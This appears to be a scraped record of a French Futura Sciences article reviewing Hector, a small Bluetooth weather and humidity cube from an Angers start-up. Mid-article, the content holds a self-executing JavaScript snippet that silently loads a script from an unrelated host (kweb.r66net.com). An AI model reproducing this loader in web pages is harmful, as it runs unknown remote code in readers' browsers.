{"title": "Hector, le petit cube qui vous informe de la pluie et du beau temps", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2016-06-01", "content": "Quel temps va-t-il faire ? Quelle est la temperature dans la chambre des enfants ? Mon vin est-il bien conserve ? Ces questions, et d'autres encore, Hector peut y repondre. Cette station connectee concue et fabriquee en France par une jeune entreprise basee a Angers propose une alternative simple et peu onereuse aux produits existants. Deja connu des professionnels, Hector est desormais commercialise vers le grand public. Hector n'est pas le concierge d'un grand hotel. C'est un cube. En fait une station  meteo  connectee qui tient dans la paume de la main. Grace a ses  capteurs  integres, elle peut relever la temperature ambiante, le taux d'humidite et mesurer la  pression atmospherique .  << Nous avons voulu creer un produit simple, facile a utiliser et tres abordable >> , a explique a Futura-Sciences Morgan Lavaux, l'un des deux fondateurs de la jeune pousse angevine qui a cree ce gadget connecte entierement fabrique en France et vendu 49,90 euros. Lorsque l'on passe a proximite avec son  smartphone ,  Hector  transmet ses informations par liaison  Bluetooth . L'appareil fonctionne aussi bien a l'interieur qu'a l'exterieur. Il peut surveiller la temperature et l'humidite d'une piece, celle d'un  refrigerateur , l' hygrometrie  d'une cave a vin ou a cigares. Et il peut donner une  prevision meteorologique  a 24 heures. Toutes les informations passent par l' application  mobile disponible sur  Android et iOS .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les restaurateurs ont adopte Hector Ce sont en premier lieu les professionnels que la jeune pousse a cherche a convaincre. Par exemple, les restaurateurs qui ont une obligation d'enregistrer les temperatures dans leurs refrigerateurs et chambres froides. Hector leur permet d'accomplir cette operation rapidement en disposant d'un historique des releves sur 20 jours. Des transporteurs ont adopte ce cube connecte pour surveiller la temperature de certains produits. Morgan Lavaux nous a egalement indique que des compagnies d'assurance s'interessaient a la solution pour faire de la  prevention  des risques lies a l'humidite. Deja vendu a 3.000 exemplaires, Hector veut desormais seduire le grand public. Et c'est grace a EDF et son programme  EDF Pulse & You  que la  start-up  a realise que son produit pouvait interesser les particuliers.  EDF Pulse & You est une plateforme en ligne communautaire ouverte a tous qui met en relation directe des createurs de projets innovants et des internautes.  << Les commentaires et les idees deposes par les usagers sur les projets des start-up sont tres precieux, tant pour ameliorer leurs produits, que faire evoluer leurs technologies ou encore inventer des services auxquels ils n'auraient pas forcement pense >> , explique Gael Le Boulch, en charge du projet chez EDF.  L'application Hector dans sa version Android. Des que le smartphone (avec la connexion Bluetooth activee) passe a proximite du cube, elle affiche la temperature, le taux d'humidite, la pression atmospherique ainsi qu'une prevision meteo a 24 heures. L'application sauvegarde un historique sur 20 jours. (c) Marc Zaffagni, Futura-Sciences                       Hector aide a prendre soin des poules Presente en avril dernier sur EDF Pulse & You, Hector a recolte pres de 600 idees dont certaines aussi originales que pertinentes.  << Un contributeur a attire notre attention sur le fait qu'Hector pouvait servir a ameliorer le confort des poules pondeuses en surveillant la stabilite de la temperature et de l'humidite dans un poulailler. Le meme principe peut s'appliquer aux terrariums des  reptiles  >> , nous a revele Morgan Lavaux. Forte de cette decouverte, l'entreprise s'est ouvert un nouveau marche et va bientot commercialiser Hector dans les jardineries de l'enseigne Truffaut. Pour le jeune patron, EDF Pulse & You  << un test marche tres important car il s'agit d'avis de personnes neutres qui n'ont aucun parti pris >> . Nous avons pu tester Hector pendant quelques jours. Petit et discret, il s'installe n'importe ou dans une piece sans se faire remarquer. L'association en liaison Bluetooth avec un  smartphone   Android  ou  iOS  est tres rapide et la prise en main de l'application mobile aisee. Il est possible de definir des seuils minimaux et maximaux pour la temperature et l' hygrometrie  afin de recevoir des alertes en cas de depassement.  Si l'on comprend bien l'interet qu'un tel outil peut avoir pour les professionnels, l'utilisation domestique demande a etre peaufinee. En effet, on aimerait que l'application nous accompagne davantage, avec des explications et des conseils pour mieux exploiter les donnees recoltees. Dommage egalement que le  logiciel  ne s'interface pas avec des installations  domotiques  pour pouvoir ajuster la temperature en cas de besoin.  << Nous avons voulu un produit simple, stable qui va evoluer dans le temps >> , nous a explique Morgan Lavaux en nous assurant que les fonctionnalites d'Hector allaient s'enrichir progressivement. ", "theme": "maison"}